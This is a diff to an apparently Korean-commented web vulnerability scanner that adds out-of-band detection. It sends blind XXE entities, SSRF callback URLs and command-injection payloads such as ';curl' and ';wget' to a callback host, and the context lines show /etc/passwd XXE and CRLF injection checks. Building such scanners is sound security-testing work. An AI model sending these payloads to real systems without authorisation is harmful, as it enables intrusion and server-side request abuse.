@@ -190,7 +190,7 @@ def _blocked(r):
     return False
 
 
-def scan_capture(exchanges, session=None, session_b=None):
+def scan_capture(exchanges, session=None, session_b=None, oob=None):
     _req[0] = 0; _warned[0] = False; truncated[0] = False
     base_hosts = {ex["host"] for ex in exchanges if ex["host"]}
     ck_a = session.cookie if session else None
@@ -239,6 +239,10 @@ def scan_capture(exchanges, session=None, session_b=None):
             if rxxe and re.search(r"root:.*:0:0:", rxxe[2]):
                 add(_f("xxe", "high", ex, "(XML본문)", "external entity file:///etc/passwd",
                        "XXE — 외부 엔티티로 /etc/passwd 반환", "true_positive"))
+            if oob is not None:      # blind XXE: 외부 엔티티가 OOB 로 역접속
+                tok = oob.new("xxe", ex, "(XML본문)")
+                _send(ex["method"], ex["url"], hdr,
+                      f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY okx SYSTEM "{oob.url(tok)}">]><r>&okx;</r>')
 
         # ── 2계정 권한검증(IDOR): A 요청을 B 세션으로 재전송 → B 응답에 'A 고유 토큰'이 있어야 확정 ──
         # 길이 유사만으로는 세션결정형(/api/mypage 처럼 id 무시하고 자기 데이터 반환) 오탐이 남는다.
@@ -325,6 +329,14 @@ def scan_capture(exchanges, session=None, session_b=None):
             rcr = _send(ex["method"], ucr, hdr, bcr)
             if rcr and any("okrcrlf" in str(k).lower() or "okrcrlf" in str(v).lower() for k, v in (rcr[1] or {}).items()):
                 add(_f("crlf-injection", "medium", ex, key, "\\r\\nokrcrlf:1", "응답 헤더 주입됨", "true_positive"))
+            # ── OOB(blind SSRF/RCE): 콜백 URL 주입(응답 아닌 역접속으로 확증) ──
+            if oob is not None:
+                if _URLISH.search(key) or str(val).lower().startswith("http"):
+                    tok = oob.new("ssrf", ex, key)
+                    uo, bo = _mutate(ex, key, loc, oob.url(tok)); _send(ex["method"], uo, hdr, bo)
+                tok = oob.new("rce", ex, key); ou = oob.url(tok)
+                for _pl in (f";curl {ou}", f"|curl {ou}", f"`curl {ou}`", f";wget -qO- {ou}"):
+                    uo, bo = _mutate(ex, key, loc, val + _pl); _send(ex["method"], uo, hdr, bo)
             # ── 권한검증(IDOR): 객체참조 파라미터를 남의 id 로 ──
             if _IDOR_NAME.search(key) and re.fullmatch(r"\d{1,12}", str(val).strip()):
                 iv = int(val)
@@ -347,6 +359,16 @@ def scan_capture(exchanges, session=None, session_b=None):
 
     # ── 저장형(Stored) XSS: 쓰기 엔드포인트에 마커 주입 → 읽기 엔드포인트 재조회서 미이스케이프 반사 확인 ──
     _stored_xss(reps, ck_a, add)
+
+    # ── OOB 콜백 수집: 역접속 온 토큰 → blind SSRF/XXE/RCE 확증 ──
+    if oob is not None:
+        _CAT = {"ssrf": "ssrf", "xxe": "xxe", "rce": "command-injection"}
+        hits = oob.collect()
+        for tok, ((kind, ex, param), hit) in hits.items():
+            add(_f(_CAT.get(kind, "ssrf"), "critical", ex, param, f"OOB {kind}",
+                   f"OOB 콜백 수신 — blind {kind} 확증(역접속 src={hit.get('src', '')}, path={hit.get('path', '')[:40]})",
+                   "true_positive"))
+        print(f"[*] OOB: 콜백 {len(hits)}건 수신(blind 확증)")
 
     print(f"[*] replay 검증: 요청 {_req[0]}건 · 확증/후보 {len(findings)}건")
     return findings
